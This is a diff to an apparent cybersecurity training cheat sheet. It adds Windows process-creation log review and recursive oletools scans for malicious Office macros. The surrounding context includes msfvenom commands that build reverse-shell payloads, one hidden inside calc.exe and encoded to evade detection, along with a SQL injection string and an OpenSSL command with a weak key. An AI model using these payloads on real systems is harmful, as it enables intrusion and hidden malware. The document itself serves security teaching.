@@ -63,6 +63,28 @@ netstat -bano
 Get-ChildItem -Path C:\Users -Include *.xlsx,*.docx,*.pdf -File -Recurse -ErrorAction SilentlyContinue
 ```
 
+### 📊 Step 6: View Process Launch Events (Event ID 4688)
+```powershell
+# Open Event Viewer and filter:
+# - Log: Security
+# - Event ID: 4688
+# - Time Range: Last hour or relevant window
+```
+> Then double-click an event and go to the **Details > Friendly View** tab. Look for:
+
+- **New Process Name** → The process that was launched  
+- **Creator Process Name** → The parent process that launched it  
+- **Process Command Line** → (if enabled via Group Policy)  
+
+🧠 For example:
+```
+New Process Name:     C:\Windows\System32\powershell.exe
+Creator Process Name: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
+```
+
+> Enable command line logging via Group Policy:  
+> `Computer Configuration > Administrative Templates > System > Audit Process Creation > Include command line in process creation events`
+
 </details>
 
 ---
@@ -83,16 +105,23 @@ Get-ChildItem -Path C:\Users -Include *.xlsx,*.docx,*.pdf -File -Recurse -ErrorA
 
 `oletools` is a Python-based toolset for analysing Microsoft OLE2 files (e.g. Office documents). It helps detect malicious macros, extract metadata, and uncover indicators of compromise.
 
-#### 🔧 Common Tools & Flags:
-```bash
-olevba -a suspicious.doc
-olevba -c suspicious.doc
-olevba --decode suspicious.doc
-olevba --json suspicious.doc
+#### 🔧 Common Tools & Recursive Scans:
+```powershell
+# Recursively analyse all documents in a folder
+olevba -r C:\Path\To\Folder\*
 
-mraptor suspicious.doc
-mraptor --json suspicious.doc
+# Optional flags:
+olevba -r --decode C:\Path\To\Folder\*
+olevba -r --json C:\Path\To\Folder\*
+```
 
+#### 🔁 mraptor (manual recursion):
+```powershell
+Get-ChildItem -Recurse -Filter *.doc* | ForEach-Object { mraptor $_.FullName }
+```
+
+#### 📄 Other Tools:
+```powershell
 olemeta suspicious.doc
 olemeta --json suspicious.doc
 
@@ -103,9 +132,14 @@ oleobj -e -d output suspicious.doc
 rtfobj -d output suspicious.rtf
 ```
 
-### 💣 Payload Crafting with `msfvenom`
+#### 🔍 Other Tool Explanations:
+- `olemeta`: Extracts file metadata (author, creation date, etc.)
+- `oleid`: Flags suspicious indicators (e.g. presence of macros or OLE objects)
+- `oleobj`: Extracts embedded objects (e.g. a hidden .exe inside a Word file)
+- `rtfobj`: Same as `oleobj`, but for RTF documents
 
-```bash
+### 💣 Payload Crafting with `msfvenom`
+```powershell
 msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format> -o <output> [-e <encoder>] [-i <iterations>] [-x <template.exe>]
 ```
 
@@ -120,18 +154,18 @@ msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format> -o <output> [-e <encod
 - `-x`: Inject into another executable
 
 #### 🧰 Examples:
-```bash
+```powershell
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 -f exe -o payload.exe
 
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.10 -f exe -x C:\Windows\System32\calc.exe -o mal.exe -e x86/shikata_ga_nai -i 3
 ```
 
 ### 🔐 File Encryption with OpenSSL
-```bash
+```powershell
 openssl.exe enc -aes-256-cbc -base64 -in "C:\Users\cyberuser\Desktop\Files\Pass.txt" -out "C:\Users\cyberuser\Desktop\Pass.enc" -K 000001234567890ABCDEFABCDEF -iv 0
 ```
 
-### 📊 Wireshark Filters
+### 📡 Wireshark Filters
 ```wireshark
 frame.number == 1437
 frame.number >= 1434 and frame.number <= 1440
@@ -176,4 +210,5 @@ Injecting:
 ```sql
 SELECT * FROM users WHERE username = '' OR 1=1;--' AND password = '';
 ```
+
 </details>
